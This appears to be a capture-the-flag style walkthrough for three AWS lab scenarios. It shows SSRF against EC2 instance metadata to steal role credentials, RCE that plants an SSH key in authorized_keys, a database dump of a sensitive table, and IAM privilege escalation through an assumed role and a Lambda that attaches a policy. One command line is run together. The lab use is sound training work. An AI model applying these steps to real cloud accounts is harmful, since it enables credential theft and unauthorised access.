# Task 1 (Lambda)

Configure your profile
```
aws configure --profile scenario4_username
```
Check Lambda
```
aws lambda list-functions --profile scenario4_username
```
Configure ec2lambda profile
```
aws configure --profile ec2lambda
```
Get the IPv4 of instance
aws ec2 describe-instances --profile ec2lambda

Go to ```http://<EC2 instance IP>```

Abuse the SSRF via the "url" parameter to hit the EC2 instance metadata by going to:
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
And then:
http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ec2_role>
Then Add the EC2 instance credentials to your AWS CLI credentials file
```
[ec2role]
aws_access_key_id = access_key
aws_secret_access_key = secret_key
aws_session_token = "token"
```


Get the admin credentials
```
aws s3 ls --profile ec2role
aws s3 ls --profile ec2role s3://sc4-secret-s3-bucket
aws s3 cp --profile ec2role s3://sc4-secret-s3-bucket/../admin-user.txt .

cat admin-user.txt
```


Configure the admin profile
```
aws configure --profile admin
aws lambda list-functions --profile admin
```
Invoke a lambda to complete the scenario_4

# Task 2 (Database)



Configure the user profile
```
aws configure --profile scenario5_username
```
Find the log file
```
aws s3 ls --profile scenario5_username
aws s3 ls s3://<bucket> --recursive --profile scenario5_username
aws s3 cp s3://<bucket>/sc5-lb-logs/AWSLogs/793950739751/elasticloadbalancing/eu-central-1/2019/06/19/555555555555_elasticloadbalancing_eu-central-1_app.sc5-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile scenario5_username
cat <file.log>
aws elbv2 describe-load-balancers --profile scenario5_username ssh-keygen -t ed25519
```
Find the secret admin page


Go to dns name of LB 

Add to DNS name of LB /XXXXXXXXXXX.html from the log file


Do the RCE attack

```
echo "your public ssh key" >> /home/ubuntu/.ssh/authorized_keys
```
Get the ip-address of current EC2 instance
```
curl ifconfig.me
ssh -i <path_to_private_ssh_key> ubuntu@<ipv4_address>
```
User access a private S3 bucket
```
aws s3 ls
aws s3 ls s3://<bucket> --recursive
aws s3 cp s3://<bucket>/db.txt
cat db.txt
```
Get the secret text stored in the RDS database
```
aws rds describe-db-instances --region eu-central-1
psql postgresql://<db_user>:<db_password>@<rds-instance-address>:5432/<db_name>
\dt
select * from sensitive_information;
```

# Task 3 (Secret Bucket)

Configure your profile
```
aws configure --profile scenario7_<user_id>
aws iam list-attached-user-policies --user-name <username_from_mail> --profile scenario7_<user_id>
aws iam get-policy-version --policy-arn <user-policy arn> --version-id v1 --profile scenario7_<user_id>
aws iam list-roles --profile scenario7_<user_id>
aws iam list-attached-role-policies --role-name LamdaExecution-role-<user_id> --profile scenario7_<user_id>
aws iam list-attached-role-policies --role-name LambdaManager-role-<username_from_mail> --profile scenario7_<user_id>
aws iam get-policy-version --policy-arn <LambdaManager-policy arn> --version-id v1 --profile scenario7_<user_id>
aws sts assume-role --role-arn <LambdaManager-role arn> --role-session-name LambdaManager --profile scenario7_<user_id>
```
Then add the lambdaManager credentials to your AWS CLI credentials file at ~/.aws/credentials) as shown below:
```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

python code:
Note: The name of the file needs to be lambda_function.py.
```
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = '<username_from_mail>', PolicyArn='<arn_from_mail>')
	return response
```

Note: The function name needs to be Sc7FinalLambda<userid>.
```
aws lambda create-function --function-name Sc7FinalLambda<userid> --runtime python3.6 --role < LamdaExecution-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager
aws lambda invoke --function-name Sc7FinalLambda<userid> out.txt --profile lambdaManager
```
If you have error try to use
```
aws lambda invoke --function-name Sc7FinalLambda<userid> --profile lambdaManager --cli-binary-format raw-in-base64-out response.json
aws s3 ls --profile scenario7_<user_id>
```
